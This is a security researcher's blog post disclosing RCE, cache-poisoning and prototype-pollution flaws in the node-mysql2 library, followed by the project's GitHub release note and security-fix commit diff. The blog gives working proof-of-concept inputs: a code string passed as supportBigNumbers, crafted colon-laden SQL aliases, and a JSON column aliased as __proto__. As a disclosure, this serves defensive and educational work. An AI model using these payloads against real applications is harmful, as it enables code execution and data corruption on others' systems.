=== Content from blog.slonser.info_2286c5d5_20250111_190412.html ===
[Slonser Notes](https://blog.slonser.info/)[Home](/)
[All posts](/posts)
[About](/posts/who-am-i/)
[Tags](/tags)
# MySQL2: Dangers of User-Defined Database Connections

Posted on Mar 26, 2024
> The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.

# Introduction

The node-mysql2 library is one of the most popular libraries for connecting to a database in JavaScript, with over 2 million installations per week.

At the end of last year, I encountered an automation system that utilized the node-mysql2 library to connect to user databases and execute queries controlled by them.
In this article, I want to discuss the issues it causes and provide you with their solutions.

# Basics

In the application I was researching, the user could establish a connection to their database and execute queries with it:

```
// Simplified example
const mysql = require('mysql2');
...
const connection = mysql.createConnection({
    host: userdata.host,
    user: userdata.user,
    database: userdata.db,
    password: userdata.password,
});
...
connection.query(userdata.query,reponseFunction)
);

```

Obviously, in this case, we cannot talk about standard SQL-related attack vectors since the connection belongs to us. Therefore, we should consider issues related to affecting other users data or server performance.

# RCE

As you might guess, I was able to find a way to execute arbitary code in such a configuration, but how is this possible?

First, let‚Äôs understand how the library works. In most cases, the first argument passed to the connection.query function is a string containing the query:

```
connection.query("SELECT 1;",reponseFunction)

```

But actually, the first argument can also be an object, where in addition to the query itself, we can pass parameters for its processing:

```
connection.query({sql:"SELECT 1;", ... },reponseFunction)

```

After that, the passed configuration parameters will be used by the response parsing [function](https://github.com/sidorares/node-mysql2/blob/1609b5393516d72a4ae47196837317fbe75e0c13/lib/parsers/text_parser.js#L14C10-L14C21).
(It‚Äôs also worth noting that these same parameters can be passed directly into the database connection, which can be useful if the query argument is filtered.)

If you look closely, you will notice that this function involves code generation. MySQL2 generates a parsing function for each query, which is then cached for optimization purposes. This is important for understanding this article.

I noticed that in most cases, it successfully sanitizes the data that enters the generated code. However, there is also a line:

```
      return `packet.parseLengthCodedInt(${supportBigNumbers})`;

```

The parameter supportBigNumbers is a number in a legitimate case, so it is not sanitized. However, are there any checks for this?

A quick look at the code revealed that such checks are absent. This piece of code will be executed if the executed query returns a BIGNUMBER, so to achieve RCE, it is sufficient to pass the following object as the first argument:

```
 {sql:`SELECT INDEX_LENGTH FROM information_schema.tables LIMIT 1`, supportBigNumbers:"console.log(1337)"}

```

As a result, you will see 1337 in the console after executing this database query.

**!!! It‚Äôs also important to understand that an object with a global prototype is used as a map. Therefore, you can use this as Prototype Pollution to achieve RCE. If the targeted application uses mysql2 and you achieve PP, you can also gain RCE.**

# Cache Poisoning

The next vulnerability becomes accessible even in stricter application configurations. Its exploitation is possible even if the first argument query is checked to ensure it is a string.
As I mentioned earlier, the library utilizes caching of generated response functions. Let‚Äôs take a look at how it was [implemented](https://github.com/sidorares/node-mysql2/blob/fd3d117da82cc5c5fa5a3701d7b33ca77691bc61/lib/parsers/parser_cache.js#L9):

```
function keyFromFields(type, fields, options, config) {
  let res =
    `${type}` +
    `/${typeof options.nestTables}` +
    `/${options.nestTables}` +
    `/${options.rowsAsArray}` +
    `/${options.supportBigNumbers || config.supportBigNumbers}` +
    `/${options.bigNumberStrings || config.bigNumberStrings}` +
    `/${typeof options.typeCast}` +
    `/${options.timezone || config.timezone}` +
    `/${options.decimalNumbers}` +
    `/${options.dateStrings}`;
  for (let i = 0; i < fields.length; ++i) {
    const field = fields[i];
    res += `/${field.name}:${field.columnType}:${field.length}:${field.schema}:${field.table}:${field.flags}:${field.characterSet}`;
  }
  return res;
}

```

As you can see, keys are inserted into the string, and ‚Äú:‚Äù is used as a delimiter. This is a poor implementation because the values passed into the key can also contain ‚Äú:‚Äù. By exploiting this characteristic, one can manipulate the hashed function:

```
  connection.query(
    'SELECT information_schema.tables.TABLE_NAME,`tables:160:63/DATA_LENGTH:8:undefined::tables`.TABLE_ROWS FROM information_schema.tables INNER JOIN information_schema.tables AS `tables:160:63/DATA_LENGTH:8:undefined::tables` ON `tables:160:63/DATA_LENGTH:8:undefined::tables`.TABLE_ROWS!=information_schema.tables.TABLE_ROWS LIMIT 1;',
    function(err, results, fields) {
    }
  );
  // Send another request and spwan new connection
  connection1.query(
    `SELECT TABLE_NAME, TABLE_ROWS, DATA_LENGTH FROM information_schema.tables LIMIT 1;`,
    function(err, results, fields) {
      console.log(results);
      console.log(fields);
    }
  );

```

You will see output:

```
[ { TABLE_NAME: 'ADMINISTRABLE_ROLE_AUTHORIZATIONS', TABLE_ROWS: 0 } ]
[
  `TABLE_NAME` VARCHAR(64) NOT NULL,
  `TABLE_ROWS` BIGINT(21) UNSIGNED,
  `DATA_LENGTH` BIGINT(21) UNSIGNED
]

```

As evident, the fields of the second request include DATA\_LENGTH, which, however, is absent in the results. This discrepancy arises because the first request stores in the cache a key `text/undefined/undefined/false/false/false/boolean/local/false/false/TABLE_NAME:253:undefined:information_schema:tables:20609:224/TABLE_ROWS:8:undefined::tables:160:63/DATA_LENGTH:8:undefined::tables:160:63` with an incorrect packet parser.

This can be used to disrupt the logic of the application, sending data types that are not expected.

Fixed in latest release.

# Prototype Poisoning / Pollution

Returning to the process of generating the function that parses the returned response, it can be observed that an object with a global prototype is used as the user-supplied [value](https://github.com/sidorares/node-mysql2/blob/fd3d117da82cc5c5fa5a3701d7b33ca77691bc61/lib/parsers/text_parser.js#L134):

```
parserFn("const result = {};");

```

Therefore, if you pass the following query:

```
SELECT CAST('{"toString": {"toString":true}, "tags": {"a": 1, "b": null}}' as JSON) AS __proto__;

```

You will notice that the response prototype has changed

```
Object.getPrototypeOf(results[0])
> { tags: { a: 1, b: null }, toString: { toString: true } }

```

his only controls a specific prototype, not the global one. However, if we have the ability to control the configuration, we can simply pass `nestTables: true`:

```
    } else if (options.nestTables === true) {
        lvalue = `result[${helpers.srcEscape(fields[i].table)}][${fieldName}]`;
    }

```

As many might understand, this will give us full prototype pollution.

# Conclusion

I informed the vendor about these issues 90 days ago and my intentions to publish this material on March 26th. Unfortunately, the vendor did not provide the necessary cooperation, ignoring my emails for months, so this material was released without the final fixes.

Today, a [fix](https://github.com/sidorares/node-mysql2/releases/tag/v3.9.3) was released that addresses the cache manipulation issue. However, the remaining problems remain relevant in the latest version.

If you are using the library in the described scenarios, I strongly advise you to limit the connection parameters and the parameters passed in the query.

2024 [Archie Theme](https://github.com/athul/archie) | Built with [Hugo](https://gohugo.io)

=== Content from github.com_9a696eb1_20250111_190416.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Freleases%2Ftag%2Fv3.9.4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Freleases%2Ftag%2Fv3.9.4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=sidorares%2Fnode-mysql2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sidorares](/sidorares)
/
**[node-mysql2](/sidorares/node-mysql2)**
Public

* [Notifications](/login?return_to=%2Fsidorares%2Fnode-mysql2) You must be signed in to change notification settings
* [Fork
  625](/login?return_to=%2Fsidorares%2Fnode-mysql2)
* [Star
   4.1k](/login?return_to=%2Fsidorares%2Fnode-mysql2)

* [Code](/sidorares/node-mysql2/tree/v3.9.4)
* [Issues
  432](/sidorares/node-mysql2/issues)
* [Pull requests
  52](/sidorares/node-mysql2/pulls)
* [Discussions](/sidorares/node-mysql2/discussions)
* [Actions](/sidorares/node-mysql2/actions)
* [Projects
  0](/sidorares/node-mysql2/projects)
* [Wiki](/sidorares/node-mysql2/wiki)
* [Security](/sidorares/node-mysql2/security)
* [Insights](/sidorares/node-mysql2/pulse)

Additional navigation options

* [Code](/sidorares/node-mysql2/tree/v3.9.4)
* [Issues](/sidorares/node-mysql2/issues)
* [Pull requests](/sidorares/node-mysql2/pulls)
* [Discussions](/sidorares/node-mysql2/discussions)
* [Actions](/sidorares/node-mysql2/actions)
* [Projects](/sidorares/node-mysql2/projects)
* [Wiki](/sidorares/node-mysql2/wiki)
* [Security](/sidorares/node-mysql2/security)
* [Insights](/sidorares/node-mysql2/pulse)

1. [Releases](/sidorares/node-mysql2/releases)
2. [v3.9.4](/sidorares/node-mysql2/releases/tag/v3.9.4)

# v3.9.4

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/sidorares/node-mysql2/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v3.9.4)

 Loading

[View all tags](/sidorares/node-mysql2/tags)

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)
released this
09 Apr 07:31

[v3.9.4](/sidorares/node-mysql2/tree/v3.9.4)

[`cf3fa60`](/sidorares/node-mysql2/commit/cf3fa60842e7e359db5b1d676f93a22ad6fea082)

This commit was created on GitHub.com and signed with GitHub‚Äôs **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

## [3.9.4](https://github.com/sidorares/node-mysql2/compare/v3.9.3...v3.9.4) (2024-04-09)

### Bug Fixes

* **SSL:** separate each certificate into an individual item [#2542](https://github.com/sidorares/node-mysql2/issues/2542) ([63f1055](https://github.com/sidorares/node-mysql2/commit/63f1055c631e665179cad686afd3e4f1d5c162b2))
* **security:** improve supportBigNumbers and bigNumberStrings sanitization ([#2572](https://github.com/sidorares/node-mysql2/issues/2572)) ([74abf9e](https://github.com/sidorares/node-mysql2/commit/74abf9ef94d76114d9a09415e28b496522a94805))
  + Fixes a potential RCE attack vulnerability reported by Vsevolod Kokorin (Slonser) of Solidlab
* **security:** improve results object creation ([#2574](https://github.com/sidorares/node-mysql2/issues/2574)) ([4a964a3](https://github.com/sidorares/node-mysql2/commit/4a964a3910a4b8de008696c554ab1b492e9b4691))
  + Fixes a potential Prototype Pollution attack vulnerability reported by Vsevolod Kokorin (Slonser) of Solidlab
* **docs:** improve the contribution guidelines ([#2552](https://github.com/sidorares/node-mysql2/issues/2552)) ([8a818ce](https://github.com/sidorares/node-mysql2/commit/8a818ce0f30654eba854759e6409c0ac856fc448))

 Assets
2

 Loading

 üëç
3
 gmmurugan, alkadoHs, and kirit0s reacted with thumbs up emoji
 üöÄ
3
 Trapboyko, alkadoHs, and fengmk2 reacted with rocket emoji

All reactions

* üëç
  3 reactions
* üöÄ
  3 reactions

 5 people reacted

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_743129ca_20250111_190414.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Fcommit%2F74abf9ef94d76114d9a09415e28b496522a94805)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Fcommit%2F74abf9ef94d76114d9a09415e28b496522a94805)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=sidorares%2Fnode-mysql2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sidorares](/sidorares)
/
**[node-mysql2](/sidorares/node-mysql2)**
Public

* [Notifications](/login?return_to=%2Fsidorares%2Fnode-mysql2) You must be signed in to change notification settings
* [Fork
  625](/login?return_to=%2Fsidorares%2Fnode-mysql2)
* [Star
   4.1k](/login?return_to=%2Fsidorares%2Fnode-mysql2)

* [Code](/sidorares/node-mysql2)
* [Issues
  432](/sidorares/node-mysql2/issues)
* [Pull requests
  52](/sidorares/node-mysql2/pulls)
* [Discussions](/sidorares/node-mysql2/discussions)
* [Actions](/sidorares/node-mysql2/actions)
* [Projects
  0](/sidorares/node-mysql2/projects)
* [Wiki](/sidorares/node-mysql2/wiki)
* [Security](/sidorares/node-mysql2/security)
* [Insights](/sidorares/node-mysql2/pulse)

Additional navigation options

* [Code](/sidorares/node-mysql2)
* [Issues](/sidorares/node-mysql2/issues)
* [Pull requests](/sidorares/node-mysql2/pulls)
* [Discussions](/sidorares/node-mysql2/discussions)
* [Actions](/sidorares/node-mysql2/actions)
* [Projects](/sidorares/node-mysql2/projects)
* [Wiki](/sidorares/node-mysql2/wiki)
* [Security](/sidorares/node-mysql2/security)
* [Insights](/sidorares/node-mysql2/pulse)

## Commit

[Permalink](/sidorares/node-mysql2/commit/74abf9ef94d76114d9a09415e28b496522a94805)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix(security): improve supportBigNumbers and bigNumberStrings sanitiz‚Ä¶

[Browse files](/sidorares/node-mysql2/tree/74abf9ef94d76114d9a09415e28b496522a94805)
Browse the repository at this point in the history

```
‚Ä¶ation ([#2572](https://github.com/sidorares/node-mysql2/pull/2572))

Fixes a potential RCE attack vulnerability reported by Vsevolod Kokorin (Slonser) of Solidlab
```

* Loading branch information

[![@wellwelwel](https://avatars.githubusercontent.com/u/46850407?s=40&v=4)](/wellwelwel)

[wellwelwel](/sidorares/node-mysql2/commits?author=wellwelwel "View all commits by wellwelwel")
authored
Apr 9, 2024

1 parent
[8a818ce](/sidorares/node-mysql2/commit/8a818ce0f30654eba854759e6409c0ac856fc448)

commit 74abf9e

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**160 additions**
and
**24 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* lib/parsers

  + lib/parsers/binary\_parser.js
    [binary\_parser.js](#diff-37a49132c0c3ef78e7a1610cffaccefe43a17422871ddb5517bef38180737304)
  + lib/parsers/text\_parser.js
    [text\_parser.js](#diff-672978cc9e6258d064c734f8e2f24e1127b67e273273b5874263851ce09d1b13)
* test/esm/unit/parsers

  + test/esm/unit/parsers/big-numbers-strings-sanitization.test.mjs
    [big-numbers-strings-sanitization.test.mjs](#diff-0b49e3b60fedb701e2395f64115e8169333a0971f515b7fe93cbd0cd155a01e0)
  + test/esm/unit/parsers/support-big-numbers-sanitization.test.mjs
    [support-big-numbers-sanitization.test.mjs](#diff-3da3c6b0f175dc8655a80e2f3d802a2fede4bb0aed4c0c43e2f67ba01279ca9e)

## There are no files selected for viewing

9 changes: 6 additions & 3 deletions

9
[lib/parsers/binary\_parser.js](#diff-37a49132c0c3ef78e7a1610cffaccefe43a17422871ddb5517bef38180737304 "lib/parsers/binary_parser.js")

Show comments

[View file](/sidorares/node-mysql2/blob/74abf9ef94d76114d9a09415e28b496522a94805/lib/parsers/binary_parser.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -12,9 +12,12 @@ for (const t in Types) { |
|  |  | } |
|  |  |  |
|  |  | function readCodeFor(field, config, options, fieldNum) { |
|  |  | const supportBigNumbers = |
|  |  | options.supportBigNumbers || config.supportBigNumbers; |
|  |  | const bigNumberStrings = options.bigNumberStrings || config.bigNumberStrings; |
|  |  | const supportBigNumbers = Boolean( |
|  |  | options.supportBigNumbers || config.supportBigNumbers, |
|  |  | ); |
|  |  | const bigNumberStrings = Boolean( |
|  |  | options.bigNumberStrings || config.bigNumberStrings, |
|  |  | ); |
|  |  | const timezone = options.timezone || config.timezone; |
|  |  | const dateStrings = options.dateStrings || config.dateStrings; |
|  |  | const unsigned = field.flags & FieldFlags.UNSIGNED; |
| Expand Down | |  |

47 changes: 26 additions & 21 deletions

47
[lib/parsers/text\_parser.js](#diff-672978cc9e6258d064c734f8e2f24e1127b67e273273b5874263851ce09d1b13 "lib/parsers/text_parser.js")

Show comments

[View file](/sidorares/node-mysql2/blob/74abf9ef94d76114d9a09415e28b496522a94805/lib/parsers/text_parser.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -12,9 +12,12 @@ for (const t in Types) { |
|  |  | } |
|  |  |  |
|  |  | function readCodeFor(type, charset, encodingExpr, config, options) { |
|  |  | const supportBigNumbers = |
|  |  | options.supportBigNumbers || config.supportBigNumbers; |
|  |  | const bigNumberStrings = options.bigNumberStrings || config.bigNumberStrings; |
|  |  | const supportBigNumbers = Boolean( |
|  |  | options.supportBigNumbers || config.supportBigNumbers, |
|  |  | ); |
|  |  | const bigNumberStrings = Boolean( |
|  |  | options.bigNumberStrings || config.bigNumberStrings, |
|  |  | ); |
|  |  | const timezone = options.timezone || config.timezone; |
|  |  | const dateStrings = options.dateStrings || config.dateStrings; |
|  |  |  |
| Expand Down  Expand Up | | @@ -85,22 +88,24 @@ function compile(fields, options, config) { |
|  |  | db: field.schema, |
|  |  | table: field.table, |
|  |  | name: field.name, |
|  |  | string: function(encoding = field.encoding) { |
|  |  | string: function (encoding = field.encoding) { |
|  |  | if (field.columnType === Types.JSON && encoding === field.encoding) { |
|  |  | // Since for JSON columns mysql always returns charset 63 (BINARY), |
|  |  | // we have to handle it according to JSON specs and use "utf8", |
|  |  | // see https://github.com/sidorares/node-mysql2/issues/1661 |
|  |  | console.warn(`typeCast: JSON column "${field.name}" is interpreted as BINARY by default, recommended to manually set utf8 encoding: \`field.string("utf8")\``); |
|  |  | console.warn( |
|  |  | `typeCast: JSON column "${field.name}" is interpreted as BINARY by default, recommended to manually set utf8 encoding: \`field.string("utf8")\``, |
|  |  | ); |
|  |  | } |
|  |  |  |
|  |  | return \_this.packet.readLengthCodedString(encoding); |
|  |  | }, |
|  |  | buffer: function() { |
|  |  | buffer: function () { |
|  |  | return \_this.packet.readLengthCodedBuffer(); |
|  |  | }, |
|  |  | geometry: function() { |
|  |  | geometry: function () { |
|  |  | return \_this.packet.parseGeometryValue(); |
|  |  | } |
|  |  | }, |
|  |  | }; |
|  |  | } |
|  |  |  |
| Expand All | | @@ -109,9 +114,7 @@ function compile(fields, options, config) { |
|  |  | /\* eslint-disable no-trailing-spaces \*/ |
|  |  | /\* eslint-disable no-spaced-func \*/ |
|  |  | /\* eslint-disable no-unexpected-multiline \*/ |
|  |  | parserFn('(function () {')( |
|  |  | 'return class TextRow {' |
|  |  | ); |
|  |  | parserFn('(function () {')('return class TextRow {'); |
|  |  |  |
|  |  | // constructor method |
|  |  | parserFn('constructor(fields) {'); |
| Expand All | | @@ -127,22 +130,22 @@ function compile(fields, options, config) { |
|  |  |  |
|  |  | // next method |
|  |  | parserFn('next(packet, fields, options) {'); |
|  |  | parserFn("this.packet = packet;"); |
|  |  | parserFn('this.packet = packet;'); |
|  |  | if (options.rowsAsArray) { |
|  |  | parserFn(`const result = new Array(${fields.length});`); |
|  |  | } else { |
|  |  | parserFn("const result = {};"); |
|  |  | parserFn('const result = {};'); |
|  |  | } |
|  |  |  |
|  |  | const resultTables = {}; |
|  |  | let resultTablesArray = []; |
|  |  |  |
|  |  | if (options.nestTables === true) { |
|  |  | for (let i=0; i < fields.length; i++) { |
|  |  | for (let i = 0; i < fields.length; i++) { |
|  |  | resultTables[fields[i].table] = 1; |
|  |  | } |
|  |  | resultTablesArray = Object.keys(resultTables); |
|  |  | for (let i=0; i < resultTablesArray.length; i++) { |
|  |  | for (let i = 0; i < resultTablesArray.length; i++) { |
|  |  | parserFn(`result[${helpers.srcEscape(resultTablesArray[i])}] = {};`); |
|  |  | } |
|  |  | } |
| Expand All | | @@ -154,7 +157,7 @@ function compile(fields, options, config) { |
|  |  | parserFn(`// ${fieldName}: ${typeNames[fields[i].columnType]}`); |
|  |  | if (typeof options.nestTables === 'string') { |
|  |  | lvalue = `result[${helpers.srcEscape( |
|  |  | fields[i].table + options.nestTables + fields[i].name |
|  |  | fields[i].table + options.nestTables + fields[i].name, |
| This comment has been minimized. [Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Fcommit%2F74abf9ef94d76114d9a09415e28b496522a94805)       Sorry, something went wrong.           Copy link    Quote reply     @MrSwitch **[MrSwitch](/MrSwitch)** [Apr 15, 2024](#r140981807)  Why does this line end with a comma `,`?      All reactions          This comment has been minimized. [Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Fcommit%2F74abf9ef94d76114d9a09415e28b496522a94805)       Sorry, something went wrong.           Copy link    Quote reply     @wellwelwel **[wellwelwel](/wellwelwel)** [Apr 15, 2024](#r140981889) Author  Collaborator   Hi [@MrSwitch](https://github.com/MrSwitch), this is automatically inserted by [**Prettier**](https://github.com/prettier/prettier).      All reactions          This comment has been minimized. [Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Fcommit%2F74abf9ef94d76114d9a09415e28b496522a94805)       Sorry, something went wrong.           Copy link    Quote reply     @MrSwitch **[MrSwitch](/MrSwitch)** [Apr 15, 2024](#r140991418)  Thanks, i realised how dumb i was being and tried to remove my comment... and failed.     üòÑ 1  wellwelwel reacted with laugh emoji   All reactions  * üòÑ   1 reaction         This comment has been minimized. [Sign in to view](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Fcommit%2F74abf9ef94d76114d9a09415e28b496522a94805)       Sorry, something went wrong.           Copy link    Quote reply     @MrSwitch **[MrSwitch](/MrSwitch)** [Apr 15, 2024](#r140992502) ‚Ä¢ edited      Loading       Thanks [@wellwelwel](https://github.com/wellwelwel) for your patch [#2591](https://github.com/sidorares/node-mysql2/pull/2591). It passed our tests with success üíØ üéâ     ‚ù§Ô∏è 1  wellwelwel reacted with heart emoji   All reactions  * ‚ù§Ô∏è   1 reaction | | |
|  |  | )}]`; |
|  |  | } else if (options.nestTables === true) { |
|  |  | lvalue = `result[${helpers.srcEscape(fields[i].table)}][${fieldName}]`; |
| Expand All | | @@ -172,11 +175,13 @@ function compile(fields, options, config) { |
|  |  | fields[i].characterSet, |
|  |  | encodingExpr, |
|  |  | config, |
|  |  | options |
|  |  | options, |
|  |  | ); |
|  |  | if (typeof options.typeCast === 'function') { |
|  |  | parserFn(`${lvalue} = options.typeCast(this.wrap${i}, function() { return ${readCode} });`); |
|  |  | } else { |
|  |  | parserFn( |
|  |  | `${lvalue} = options.typeCast(this.wrap${i}, function() { return ${readCode} });`, |
|  |  | ); |
|  |  | } else { |
|  |  | parserFn(`${lvalue} = ${readCode};`); |
|  |  | } |
|  |  | } |
| Expand All | | @@ -193,11 +198,11 @@ function compile(fields, options, config) { |
|  |  | if (config.debug) { |
|  |  | helpers.printDebugWithCode( |
|  |  | 'Compiled text protocol row parser', |
|  |  | parserFn.toString() |
|  |  | parserFn.toString(), |
|  |  | ); |
|  |  | } |
|  |  | if (typeof options.typeCast === 'function') { |
|  |  | return parserFn.toFunction({wrap}); |
|  |  | return parserFn.toFunction({ wrap }); |
|  |  | } |
|  |  | return parserFn.toFunction(); |
|  |  | } |
| Expand Down | |  |

66 changes: 66 additions & 0 deletions

66
[test/esm/unit/parsers/big-numbers-strings-sanitization.test.mjs](#diff-0b49e3b60fedb701e2395f64115e8169333a0971f515b7fe93cbd0cd155a01e0 "test/esm/unit/parsers/big-numbers-strings-sanitization.test.mjs")

Show comments

